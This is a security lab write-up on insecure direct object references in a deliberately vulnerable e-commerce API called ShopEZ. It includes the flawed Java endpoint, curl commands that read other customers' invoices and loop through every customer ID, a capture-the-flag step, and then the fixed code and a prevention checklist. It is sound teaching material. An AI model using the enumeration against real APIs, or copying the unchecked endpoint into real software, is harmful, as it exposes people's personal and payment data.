# Insecure Direct Object Reference (IDOR)

**Date:** May 8, 2026  
**Vulnerability:** Insecure Direct Object Reference (CWE-639), Authorization Bypass Through User-Controlled Key (CWE-566)  
**OWASP Category:** [A01:2021 – Broken Access Control](../reference/owasp-top-10.md)

---

## What Was Demonstrated

In this session, we explored **IDOR (Insecure Direct Object Reference)** by building **ShopEZ** — an e-commerce platform where customers place orders, receive invoices, and maintain wishlists. The API uses sequential integer IDs to fetch customer profiles, orders, invoices, and wishlists — but the vulnerable endpoints never verify that the authenticated user owns the requested resource.

The attack: Log in as any customer → change the `{id}` in the URL → access another customer's orders, invoices (with payment card details), shipping addresses, and purchase history.

### The Real-World Impact

IDOR is the **#1 most common API vulnerability** found in bug bounty programs. Real examples:

- **2019 — First American Financial Corp.** — 885 million mortgage documents exposed via sequential document IDs
- **2022 — Optus (Australian telco)** — 9.8 million customer records leaked by iterating API IDs
- **2024 — Dell** — 49 million customer order records scraped via partner portal IDOR
- **E-commerce breaches** — Customer order histories, saved payment methods, and shipping addresses exposed through predictable order/invoice IDs

!!! danger "Problem"
    The API endpoint `/api/v1/customers/{id}/invoices` accepts a customer ID from the URL path and returns invoice data (including payment card last-4-digits, billing addresses, and order amounts) without checking if the authenticated user owns that customer account. Any authenticated user can enumerate all customer IDs (1, 2, 3...) and access sensitive financial data belonging to other customers.

---

## Resources

### :material-docker: Container Images

```bash
# Pull and run the app
docker pull ghcr.io/<owner>/<repo>/fixitfriday/session-5-idor:latest
docker run -p 8080:8080 ghcr.io/<owner>/<repo>/fixitfriday/session-5-idor:latest
```

### :material-github: Source Code

- **Session-5-IDOR** — Spring Boot + Spring Security retail app with vulnerable (v1) and secure (v2) API endpoints

---

## API Endpoints

### Vulnerable API (`/api/v1`) — No authorization checks

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v1/customers/{id}/profile` | GET | Customer profile (name, email, phone, address) |
| `/api/v1/customers/{id}/orders` | GET | Order history (items, amounts, tracking numbers, shipping addresses) |
| `/api/v1/customers/{id}/invoices` | GET | Invoices (payment card info, billing addresses, amounts) |
| `/api/v1/customers/{id}/wishlist` | GET | Wishlist items (products, prices, personal notes) |
| `/api/v1/orders/{id}` | GET | Single order details |
| `/api/v1/orders/{id}/invoice` | GET | Invoice for a specific order |
| `/api/v1/invoices/{id}` | GET | Single invoice by ID |
| `/api/v1/customers/{id}/full-account` | GET | Complete customer dossier (all of the above) |

### Secure API (`/api/v2`) — Ownership verification enforced

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v2/customers/{id}/profile` | GET | Same data, but verifies ownership |
| `/api/v2/customers/{id}/orders` | GET | 403 if you don't own the account |
| `/api/v2/customers/{id}/invoices` | GET | Support/Admin can access any |
| `/api/v2/customers/{id}/wishlist` | GET | Customers can only see their own |
| `/api/v2/orders/{id}` | GET | Checks order belongs to caller |
| `/api/v2/orders/{id}/invoice` | GET | Checks order ownership |
| `/api/v2/invoices/{id}` | GET | Checks invoice ownership |
| `/api/v2/customers/{id}/full-account` | GET | Full authorization check |

### Helper Endpoints

| Endpoint | Method | Auth | Description |
|----------|--------|------|-------------|
| `/api/public/info` | GET | None | Lab instructions, credentials, hints |
| `/api/whoami` | GET | Yes | Shows your username and customer ID |

---

## Credentials

| Username | Password | Role | Customer ID |
|----------|----------|------|-----------|
| `john` | `john123` | CUSTOMER | 1 |
| `sarah` | `sarah123` | CUSTOMER | 2 |
| `mike` | `mike123` | CUSTOMER | 3 |
| `emma` | `emma123` | CUSTOMER | 4 |
| `support` | `support123` | SUPPORT | 5 |
| `admin` | `admin123` | ADMIN | 6 |

---

## Vulnerability Details

### Seed Data — The "ShopEZ Database"

The app seeds realistic e-commerce data at startup:

| Customer | What's Sensitive |
|----------|-----------------|
| **John** (id=1) | $1,300 MacBook order, VISA ending 4242, home address |
| **Sarah** (id=2) | $3,450 luxury goods, AMEX ending 1001, government address |
| **Mike** (id=3) | $15,750 corporate IT order, PO numbers, corporate card ending 8834 |
| **Emma** (id=4) | Gift orders with recipients' names & addresses |
| **Admin** (id=6) | Contains the CTF flag in an order |

### The Vulnerable Code

```java
@GetMapping("/customers/{id}/invoices")
public List<Invoice> getCustomerInvoices(@PathVariable Long id) {
    // ❌ No check: Is the logged-in user allowed to see customer {id}'s invoices?
    return invoiceRepo.findByCustomerId(id);
}
```

The endpoint blindly trusts the `{id}` parameter from the URL. The user is authenticated (they had to log in), but there's **no authorization** — no verification that the authenticated user is customer `{id}`.

### Exploitation

#### 1. Discover Your Identity

```bash
curl -u john:john123 http://localhost:8080/api/whoami
```

Response: `{"username":"john","customerId":1,"message":"Use your customer ID to access YOUR orders. Can you see others'?"}`

#### 2. Access Your Own Orders (Legitimate)

```bash
curl -u john:john123 http://localhost:8080/api/v1/customers/1/orders | python -m json.tool
```

#### 3. Access Another Customer's Invoices (IDOR Attack)

```bash
# John accessing Sarah's invoices — leaks her AMEX card info
curl -u john:john123 http://localhost:8080/api/v1/customers/2/invoices | python -m json.tool
```

Returns Sarah's payment card (AMEX ending 1001), billing address, and order amounts.

#### 4. Access Corporate Orders (B2B Data Theft)

```bash
# John accessing Mike's corporate IT orders
curl -u john:john123 http://localhost:8080/api/v1/customers/3/orders | python -m json.tool
```

Leaks: $15,750 server order, corporate PO numbers, office address.

#### 5. Enumerate All Customers (Mass Data Exfiltration)

```bash
# Loop through all customer IDs
for i in $(seq 1 6); do
  echo "=== Customer $i ==="
  curl -s -u john:john123 http://localhost:8080/api/v1/customers/$i/full-account | python -m json.tool
done
```

#### 6. Direct Invoice/Order Access

```bash
# Access invoice by ID directly — no customer context needed
curl -u john:john123 http://localhost:8080/api/v1/invoices/3 | python -m json.tool
# → Sarah's AMEX card details exposed

# Access order by ID
curl -u john:john123 http://localhost:8080/api/v1/orders/5 | python -m json.tool
# → Mike's $15,750 corporate order
```

#### 7. CTF — Extract the Flag

```bash
# The admin's orders contain the flag
curl -u john:john123 http://localhost:8080/api/v1/customers/6/orders | python -m json.tool
```

!!! example "IDOR in Action"
    ```
    Logged in as: john (Customer ID: 1)
    Requesting: /api/v1/customers/3/invoices

    Response:
    [
      {
        "id": 5,
        "customerId": 3,
        "orderId": 5,
        "total": 17148.75,
        "paymentMethod": "Corporate PO #NYC-2026-0892",
        "cardLast4": "8834",
        "billingAddress": "350 Fifth Ave, New York, NY"
      }
    ]

    ❌ John just accessed Mike's corporate payment details!
    ```

---

### The Fix — Secure Code

```java
@GetMapping("/customers/{id}/invoices")
public List<Invoice> getCustomerInvoices(@PathVariable Long id, Authentication auth) {
    Customer customer = customerRepo.findById(id)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));

    // ✅ Verify the authenticated user owns this resource OR has elevated privileges
    String currentUser = auth.getName();
    boolean isOwner = customer.getUsername().equals(currentUser);
    boolean isPrivileged = auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_SUPPORT")
                        || a.getAuthority().equals("ROLE_ADMIN"));

    if (!isOwner && !isPrivileged) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN,
                "Access denied: you can only view your own account data");
    }

    return invoiceRepo.findByCustomerId(id);
}
```

#### Verify the Fix

```bash
# John trying to access Sarah's invoices via the secure endpoint
curl -u john:john123 http://localhost:8080/api/v2/customers/2/invoices
# → 403 Forbidden

# John accessing his own invoices
curl -u john:john123 http://localhost:8080/api/v2/customers/1/invoices
# → 200 OK

# Support staff accessing any customer (authorized by role)
curl -u support:support123 http://localhost:8080/api/v2/customers/3/invoices
# → 200 OK
```

---

## Key Takeaways

| Principle | Description |
|-----------|-------------|
| **Authentication ≠ Authorization** | Being logged in doesn't mean you can access everything |
| **Never trust client-supplied IDs** | Always verify ownership server-side |
| **Check at the resource level** | Even `/orders/{id}` must verify the order's owner |
| **Use indirect references** | Consider UUIDs or mapping tables instead of sequential IDs |
| **Defense in depth** | Combine ownership checks + role-based access + rate limiting |
| **Test horizontally** | Automated tools miss IDOR — manual testing between same-role users is essential |

---

## Prevention Checklist

- [x] Verify resource ownership on every data access endpoint
- [x] Use the authenticated user's session to determine access, not URL parameters alone
- [x] Implement role-based access control (RBAC) for elevated access (support/admin)
- [x] Use UUIDs instead of sequential integers for external-facing IDs
- [x] Log and alert on access patterns suggesting enumeration
- [x] Include IDOR testing in security review checklists
- [x] Rate-limit API endpoints to slow down enumeration attacks
